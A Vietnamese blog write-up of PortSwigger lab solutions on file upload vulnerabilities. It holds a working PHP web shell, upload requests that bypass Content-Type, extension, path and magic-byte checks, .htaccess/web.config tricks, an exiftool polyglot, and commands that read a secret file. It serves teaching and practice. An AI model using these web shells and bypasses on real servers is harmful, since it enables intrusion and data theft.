---
title: "[PortSwigger Lab] - File Upload Vulneralbilities"
description: Solution of File Upload Vulneralbilities on PortSwigger Lab
date: 2025-06-02 10:00:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, file upload vulnerabilities]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-02-portswigger-lab-file-upload-vulnerabilities/file-upload-vulnerabilities.png
    alt: File Upload Vulneralbilities
---

## Introduction
---
### What are **file upload vulnerabilities**?
**File upload vulnerabilities** là lỗ hổng xảy ra khi máy chủ web cho phép người dùng tải tệp lên hệ thống mà không kiểm tra kỹ lưỡng các yếu tố như:
- Tên tệp,
- Loại tệp,
- Nội dung bên trong tệp,
- Kích thước tệp,…
Nếu không áp dụng các giới hạn kiểm tra nghiêm ngặt, ngay cả chức năng tải ảnh thông thường cũng có thể bị lợi dụng để tải lên những tệp độc hại, chẳng hạn như:
- Tệp thực thi mã phía máy chủ (ví dụ .php, .jsp), từ đó kẻ tấn công có thể thực hiện điều khiển từ xa.

Trong một số trường hợp, việc tải lên tệp đã đủ gây thiệt hại. Còn trong các cuộc tấn công khác, kẻ tấn công sẽ gửi thêm một yêu cầu HTTP tới tệp đã tải lên để kích hoạt việc thực thi mã độc.
### What is the impact of **file upload vulnerabilities**?
Tác động phụ thuộc vào hai yếu tố chính:
1. Trang web không kiểm tra kỹ yếu tố nào của tệp: Kích thước, loại tệp, nội dung…
2. Trang web áp dụng những giới hạn nào với tệp sau khi tải lên.

Trường hợp xấu nhất:
- Tệp không được kiểm tra loại đúng cách.
- Máy chủ cho phép thực thi một số loại tệp (như .php).
    ⇒ Kẻ tấn công có thể tải lên một tệp mã độc (web shell) và chiếm quyền điều khiển máy chủ.

Nếu không kiểm tra tên tệp, kẻ tấn công có thể:
- Ghi đè lên các tệp quan trọng nếu tên tệp trùng nhau.
- Nếu máy chủ có lỗ hổng **directory traversal**, kẻ tấn công có thể ghi tệp vào vị trí không mong muốn.

Nếu không kiểm tra kích thước tệp, kẻ tấn công có thể thực hiện:
- Tấn công từ chối dịch vụ (DoS) bằng cách tải lên tệp lớn để làm đầy dung lượng ổ đĩa.

### How do file upload vulnerabilities arise?
Do tính nguy hiểm rõ ràng của lỗ hổng này, hiếm có trang web cho phép tải lên tệp mà không có giới hạn nào. Tuy nhiên:
-   Lập trình viên thường triển khai các biện pháp kiểm tra tưởng như an toàn nhưng lại có thể bị qua mặt.
Ví dụ:
    - Chặn (blacklist) một số loại tệp nguy hiểm, nhưng quên xét đến các cách viết mở rộng tệp khác nhau hoặc các định dạng hiếm.
    - Kiểm tra loại tệp bằng thông tin dễ bị giả mạo như header MIME hoặc phần mở rộng .jpg, .gif (dễ thay đổi qua công cụ như Burp Suite).

Ngoài ra, các biện pháp kiểm tra có thể không đồng nhất giữa các phần khác nhau của website, dẫn đến lỗ hổng có thể bị khai thác.

### How do web servers handle requests for static files?
Để hiểu cách khai thác lỗ hổng tải lên tệp, bạn cần hiểu cơ bản cách máy chủ xử lý tệp tĩnh **(static files)**:
- Trước đây, website chủ yếu là tệp tĩnh (image, HTML), và mỗi yêu cầu HTTP tương ứng 1 tệp trên hệ thống.
- Ngày nay, nhiều website là nội dung động, nhưng vẫn có tệp tĩnh như CSS, image...

Quy trình xử lý tệp tĩnh:
1. Máy chủ phân tích đường dẫn trong yêu cầu để xác định phần mở rộng của tệp.
2. Dựa trên phần mở rộng, máy chủ xác định loại MIME và xử lý tùy theo cấu hình:
    - Nếu tệp không thể thực thi (HTML, image,…): máy chủ gửi trực tiếp nội dung tệp về trình duyệt.
    - Nếu là tệp thực thi (PHP,…):
        - Nếu máy chủ cho phép, nó sẽ chạy mã trong tệp.
        - Nếu không, máy chủ sẽ trả lỗi – hoặc trong trường hợp lỗi cấu hình, có thể hiển thị nội dung mã nguồn (dẫn đến rò rỉ thông tin nhạy cảm).


> Header **Content-Type** trong phản hồi HTTP có thể tiết lộ gợi ý về loại tệp mà máy chủ nghĩ rằng nó đang phục vụ. Nếu ứng dụng không tự đặt thủ công **Content-Type**, thì giá trị trong header này thường là kết quả của việc máy chủ ánh xạ phần mở rộng tệp sang loại MIME.
{: .prompt-tip }

## Solve File Upload Vulneralbilities Lab
---

Some other functions that can be used to execute commands in PHP:

| Hàm PHP        | Mô tả                                           |
| -------------- | ----------------------------------------------- |
| `system()`     | Thực thi lệnh và in kết quả trực tiếp           |
| `exec()`       | Thực thi lệnh và trả về kết quả dưới dạng biến  |
| `shell_exec()` | Thực thi lệnh và trả về kết quả dưới dạng chuỗi |
| `passthru()`   | Dùng cho các lệnh in dữ liệu nhị phân           |
| `popen()`      | Mở tiến trình lệnh như một file handle          |

### Lab: Remote code execution via web shell upload
- Đăng nhập và upload file `evil.php` với nội dung
```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```
- Ứng dụng method GET để thay đổi lệnh động thông qua params thay vì sửa thẳng trong file tĩnh
- dùng hàm `system()` để thực thi lệnh
- Mở file `evil.php` kèm theo cmd param để lấy nội dung **secret**
```
https://0ace00440407e4c382675bd50049003e.web-security-academy.net/files/avatars/evil.php?cmd=cat%20/home/carlos/secret
```
- Submit solution

### Lab: Web shell upload via **Content-Type** restriction bypass
#### Analysis
- Vẫn upload file `evil.php` như trên nhưng nhận được thông báo
```
Sorry, file type application/x-php is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.
```
- Cho thấy ứng dụng block dựa trên **Content-Type**

#### Exploit
- Ý tưởng: Thay đổi **Content-Type** thành image/jpeg để ứng dụng xử lý nó như file ảnh
- Gửi request của file đã upload đến **repeater**
Request:

```http
POST /my-account/avatar HTTP/2
Host: 0ace00220446375280713579007c0090.web-security-academy.net
...
Content-Disposition: form-data; name="avatar"; filename="evil.php"
Content-Type: image/jpeg

<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
...
```
- Mở file đã up ở 1 tab mới và khai thác
```
https://0ace00220446375280713579007c0090.web-security-academy.net/files/avatars/evil.php?cmd=cat%20/home/carlos/secret
```
- Submit solution

### Lab: Web shell upload via path traversal
#### Analysis
- Upload file tương tự như lab trên, và thử khai thác
- Trường hợp này ứng dụng đã ngắn thực thi mã trong thư mục người dùng, cụ thể là `/files/avatars` nên không thể thực thi `evil.php`

#### Exploit
- Ý tưởng: Upload file vào thư mục có thể thực thi được, khai thác kết hợp `path traversal`
- Gửi request của file đã upload đến **repeater**
Request:

```http
POST /my-account/avatar HTTP/2
Host: 0af9001c03437b5880e935270059002a.web-security-academy.net
...
Content-Disposition: form-data; name="avatar"; filename="../evil.php"
Content-Type: application/x-php

<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
...
```
- Mở file vừa upload ở tab mới và khai thác
```
https://0af9001c03437b5880e935270059002a.web-security-academy.net/files/evil.php?cmd=cat%20/home/carlos/secret
```
- Submit solution

### Web shell upload via extension blacklist bypass
#### Analysis
- Upload `evil.php` như trên và gửi đến **repeater**
- Nhận được:
```
Sorry, php files are not allowed Sorry, there was an error uploading your file.
```

- Cho thấy không cho phép thực thi file `.php`
- Thử các đuôi file có thể thực thi **PHP** khác: `.php5`, `.phtml`, `.shtml`, `.phar`. Không thành công

Ý tưởng: 
- Thay đổi config local, để thực thi 1 file tùy ý
- Một số **web server** cho phép cấu hình riêng theo từng thư mục. Điều này có thể bị lợi dụng nếu bạn upload được file cấu hình độc hại vào thư mục đó.

### Exploit
- Thử tất cả các trường hợp xảy ra khi chưa biết trước được loại `web server` của nó:
    - Trên **Apache**: Tập tin cấu hình theo thư mục: .htaccess
    ```
        AddType application/x-httpd-php .evil
    ```

    - Trên **IIS (Windows Server)**: Sử dụng file web.config
    ```
        <staticContent>
            <mimeMap fileExtension=".evil" mimeType="application x-httpd-php" />
        </staticContent>
    ```

- Upload lại file `evil.php` nhưng đổi **extension** thành **evil.evil**
- Mở file `evil.evil` ở tab mới và tiến hành khai thác
```
https://0acd00a903eca6058378b4200086001b.web-security-academy.net/files/avatars/evil.evil?cmd=cat%20/home/carlos/secret
```
- Submit solution

### Web shell upload via obfuscated file extension
#### Analysis
- Upload `evil.php` như trên và gửi đến **repeater**
- Nhận được:
```
Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file.
```
- Chỉ cấp nhận file `.jpg` và `.png`
- Ý tưởng: Sử dụng kỹ thuật **null byte** để up file có đuôi `.jpg` hoặc `.png`, khi **web server** xửa lý sẽ bỏ qua phần extension của file ảnh

#### Exploit
- Thay đổi `evil.php` thành `evil.php%00.png`
- Mở file `evil.php` ở tab mới và khai thác
```
    https://0a2c00040341e23c8017bc0200510088.web-security-academy.net/files/avatars/evil.php?cmd=cat%20/home/carlos/secret
```

### Lab: Remote code execution via polyglot web shell upload
Thay vì chỉ kiểm tra phần đuôi `.jpg`, `.png`, server kiểm tra cả nội dung thật sự bên trong file **(file signature**/**magic bytes)**.

Common **(file signature**/**magic bytes)** table 

| Định dạng          | Magic Bytes (Hex)              | Magic Bytes (ASCII) | Ghi chú                |
| ------------------ | ------------------------------ | ------------------- | ---------------------- |
| **JPEG (JPG)**     | `FF D8 FF E0` – `FF D8 FF E8`  | `ÿØÿà` hoặc `ÿØÿè`  | File ảnh JPG           |
| **PNG**            | `89 50 4E 47 0D 0A 1A 0A`      | `.PNG....`          | File ảnh PNG           |
| **GIF87a**         | `47 49 46 38 37 61`            | `GIF87a`            | File ảnh GIF cổ điển   |
| **GIF89a**         | `47 49 46 38 39 61`            | `GIF89a`            | File ảnh GIF phổ biến  |
| **PDF**            | `25 50 44 46`                  | `%PDF`              | File PDF               |
| **ZIP**            | `50 4B 03 04`                  | `PK..`              | File nén .zip          |
| **RAR**            | `52 61 72 21 1A 07 00`         | `Rar!...`           | File RAR               |
| **7-Zip**          | `37 7A BC AF 27 1C`            | `7z...'.`           | File 7z                |
| **EXE (Windows)**  | `4D 5A`                        | `MZ`                | Executable .exe        |
| **ELF (Linux)**    | `7F 45 4C 46`                  | `.ELF`              | Executable ELF (Linux) |
| **BMP**            | `42 4D`                        | `BM`                | File ảnh Bitmap        |
| **TIFF (LE)**      | `49 49 2A 00`                  | `II*.`              | TIFF little endian     |
| **TIFF (BE)**      | `4D 4D 00 2A`                  | `MM.*`              | TIFF big endian        |
| **MP3**            | `49 44 33`                     | `ID3`               | File MP3 có metadata   |
| **MP4**            | `00 00 00 18 66 74 79 70`      | `....ftyp`          | File MP4               |
| **DOCX/XLSX/PPTX** | `50 4B 03 04`                  | `PK..`              | Thực chất là ZIP       |
| **Python (.pyc)**  | `42 0D 0D 0A` hoặc tùy version |                     | Bytecode Python        |

#### Idea 1: Insert shell into **metadata (Exif)** of IMAGE file
**Công cụ:** exiftool
```shell
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" input.jpg -o polyglot.php
```

Thành phần:
- **exiftool:** công cụ để chỉnh sửa **metadata** của file ảnh **(JPEG, PNG, …)**
- **-Comment="...":** chèn chuỗi này vào trường **comment** trong **metadata** của ảnh.
- **<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>**: là mã PHP dùng để đọc file **secret** của Carlos, rồi in ra theo định dạng `START ... END`
- **input.jpg:** ảnh JPEG ban đầu dùng làm nền (ảnh bất kỳ, không cần đặc biệt)
- **-o polyglot.php:** tên file output, đuôi .php để lừa server xử lý file như một script PHP

Upload `polyglot.php` và đọc nó
```
�PNG  IHDR�~#U�JcICP �i;2sRGB���StEXtCommentSTART cSwTovLDzGP7ofwcQzgXVE9gEB0JcF0a ENDԴ`P IDATx
```

Nguyên lý hoạt động:
- Server chấp nhận loại file dựa trên **file signature**
- **exiftool** thêm **code PHP** vào trường **comment** trong **metadata** của ảnh và đặt tên file `.php` để **mod-php** xử lý
- Khi xử lý file `.php`, chỉ cần xuất hiện <?php ... ?> thì mã sẽ được thực thi

#### Idea 2: Change **(file signature**/**magic bytes)** of PHP file
- Upload `evil.php` và gửi nó đến **repeater**
- Thêm **(file signature**/**magic bytes)** và gửi lại request

```http
POST /my-account/avatar HTTP/2
Host: 0ad20004039c6fc4808495c80073008d.web-security-academy.net
...
Content-Disposition: form-data; name="avatar"; filename="evil.php"
Content-Type: application/x-php

GIF89a
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
...
```

- Mở file `evil.php` ở tab mới và khai thác
```
https://0ad20004039c6fc4808495c80073008d.web-security-academy.net/files/avatars/evil.php?cmd=cat%20/home/carlos/secret
```

Result:
```
GIF89a cSwTovLDzGP7ofwcQzgXVE9gEB0JcF0a
```

Nguyên lý hoạt động:
- Server chấp nhận loại file dựa trên **file signature**
- Thay đổi **file signature** của file **PHP** để server chấp nhận nó
- Khi xử lý file `.php`, chỉ cần xuất hiện <?php ... ?> thì mã sẽ được thực thi

---
Goodluck! 🍀🍀🍀